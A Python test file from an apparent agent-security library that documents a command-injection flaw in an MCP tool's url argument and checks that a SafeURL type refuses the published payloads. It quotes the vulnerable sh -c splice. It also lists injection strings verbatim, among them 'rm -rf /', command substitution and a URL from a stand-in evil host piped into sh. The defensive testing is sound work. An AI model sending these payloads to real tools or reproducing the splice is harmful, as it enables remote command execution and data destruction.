"""CVE-2026-102911 — pi-llm-wiki `wiki_capture_source` splices its `url` argument into `sh -c`.

Vulnerability (from NVD, upstream issue #185 and fix commit 3608670, retrieved 2026-10-02):
    pi-llm-wiki up to 0.11.7 exposes an MCP tool, ``wiki_capture_source``, whose ``url``
    argument reaches ``extractWithMarkItDown`` in
    ``extensions/llm-wiki/lib/source-extractors.ts``. That function ran ``sh`` with these arguments:

        ["-c", `uvx --from 'markitdown[docx,pdf]' markitdown "${source}" 2>/dev/null || echo ""`]

    The value sits inside double quotes, so ``$(...)`` and backticks run where they
    stand, and a ``"`` closes the quoting so that ``;``, ``|`` or ``&&`` start a command
    of the caller's choosing. The published proof of concept sends ``url`` as
    ``";open -a Calculator;# ``. Fixed in 0.11.8 (PR #186), which passes ``source`` as
    its own argv element with no shell.

Advisory: https://github.com/zosmaai/pi-llm-wiki/issues/185
Fix:      https://github.com/zosmaai/pi-llm-wiki/commit/360867034e79175b45c8e04a98e4ca712bbaca35
NVD:      https://nvd.nist.gov/vuln/detail/CVE-2026-102911
CVSS:     9.9 (CRITICAL) — CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:C/C:H/I:H/A:H, CWE-77 + CWE-78

Airlock fit: partial.
    A ``url`` typed ``SafeURL`` refuses every payload here that runs a command through the
    double-quoted splice. Upstream's own payloads are not https URLs, so the scheme check
    refuses them. Put inside one, each still carries a ``"`` that ends the quoting, a
    backtick, a ``|`` or ``$(``, and since 0.10.22 ``SafeURL`` refuses a URL carrying a
    character RFC 3986 requires to be percent-encoded, and ``$(``. Until then it checked
    only where a URL points, and these four cases were held here as strict ``xfail``
    (issue #256).

    What it cannot refuse: ``$NAME`` inside the double quotes still expands, so a URL can
    carry an environment variable into the fetch. ``$name`` is ordinary URL syntax
    (OData's ``$select``), and refusing it would break real URLs. The complete fix is the
    upstream one: pass the URL as its own argv element, with no shell.
"""

from __future__ import annotations

import pytest
from scripts.cve_watcher import classify_shape

from agent_airlock import Airlock, SafeURL
from agent_airlock.self_heal import BlockReason

CVE = "CVE-2026-102911"

#: NVD's description, verbatim, so the classifier assertions below are checked
#: against the real record rather than a paraphrase of it.
NVD_DESCRIPTION = (
    "A flaw has been found in zosmaai pi-llm-wiki up to 0.11.7. Affected is an unknown "
    "function of the file mcp/index.ts of the component wiki_capture_source MCP tool. "
    "Executing a manipulation of the argument url can lead to os command injection. The "
    "attack can be executed remotely. The exploit has been published and may be used. "
    "Upgrading to version 0.11.8 is able to address this issue. This patch is called "
    "360867034e79175b45c8e04a98e4ca712bbaca35. Upgrading the affected component is "
    "advised."
)

NVD_CWES = ["CWE-77", "CWE-78"]

#: The payloads upstream's own regression test feeds ``url``
#: (``test/source-extractors-security.test.ts`` in 3608670), verbatim.
UPSTREAM_PAYLOADS = (
    '";open -a Calculator;# ',
    '";echo INJECTED > /tmp/pwned;# ',
    "$(whoami)",
    "`id`",
    "a; rm -rf / #",
    "x && echo hacked",
    "x || echo hacked",
    "x\n echo hacked",
)

#: The same attack inside a well-formed https URL, with the part of SafeURL's refusal
#: that names it. Each still runs a command once spliced into the vulnerable ``sh -c``
#: string: substitution runs inside double quotes, and ``;`` and ``|`` run after a ``"``
#: has closed them.
URL_PAYLOADS = (
    (
        "quote break then semicolon",
        'https://example.com/";open -a Calculator;# ',
        "must be percent-encoded",
    ),
    ("dollar-paren substitution", "https://example.com/$(whoami)", "shell command substitution"),
    ("backtick substitution", "https://example.com/`id`", "must be percent-encoded"),
    ("quote break then pipe", 'https://evil.example/run.md"|sh #', "must be percent-encoded"),
)


@Airlock()
def wiki_capture_source(url: SafeURL) -> str:
    """The tool's shape, with ``url`` given the narrowest type the library ships for it."""
    return "captured"


class TestThePublishedPayloadIsRefusedByTheSchemeCheck:
    """Upstream's payloads are refused before anything else is looked at.

    None of them is an https URL, so the scheme check refuses each one. That alone was
    never metacharacter detection, which is why the next class exists.
    """

    @pytest.mark.parametrize("payload", UPSTREAM_PAYLOADS)
    def test_it_is_refused_as_a_url_without_an_https_scheme(self, payload: str) -> None:
        result = wiki_capture_source(url=payload)
        assert isinstance(result, dict), "the published payload reached the tool body"
        assert result["block_reason"] == BlockReason.VALIDATION_ERROR.value
        assert "scheme" in result["error"]


class TestTheSamePayloadInsideAUrl:
    """Strict ``xfail`` until 0.10.22, when ``SafeURL`` started reading characters (#256)."""

    @pytest.mark.parametrize(
        ("label", "url", "why"), URL_PAYLOADS, ids=[p[0] for p in URL_PAYLOADS]
    )
    def test_it_is_refused(self, label: str, url: str, why: str) -> None:
        result = wiki_capture_source(url=url)

        assert isinstance(result, dict), f"{label}: SafeURL admitted {url!r}"
        assert result["block_reason"] == BlockReason.VALIDATION_ERROR.value
        assert why in result["error"]


class TestScopeBoundary:
    """What ``SafeURL`` still lets through, and why that is the right line."""

    def test_a_dollar_name_still_passes_because_urls_use_it(self) -> None:
        # OData and Microsoft Graph put `$select`, `$top` and `$filter` in real URLs, so
        # `$name` cannot be refused. The cost: inside the vulnerable double quotes
        # `$NAME` would still expand an environment variable into the fetch.
        url = "https://graph.microsoft.com/v1.0/users?$select=displayName&$top=5"

        assert wiki_capture_source(url=url) == "captured"

    def test_a_plain_capture_url_still_reaches_the_tool(self) -> None:
        assert wiki_capture_source(url="https://example.com/page.html") == "captured"


class TestWatcherAdmittedThisOnBothSignals:
    """Either signal alone would have filed it: the description and CWE-77 / CWE-78."""

    def test_it_is_a_candidate_on_the_full_record(self) -> None:
        assert classify_shape(NVD_DESCRIPTION, NVD_CWES) == "candidate"

    def test_the_description_alone_files_it(self) -> None:
        assert classify_shape(NVD_DESCRIPTION, []) == "candidate"

    def test_the_cwes_alone_file_it(self) -> None:
        assert classify_shape("", NVD_CWES) == "candidate"
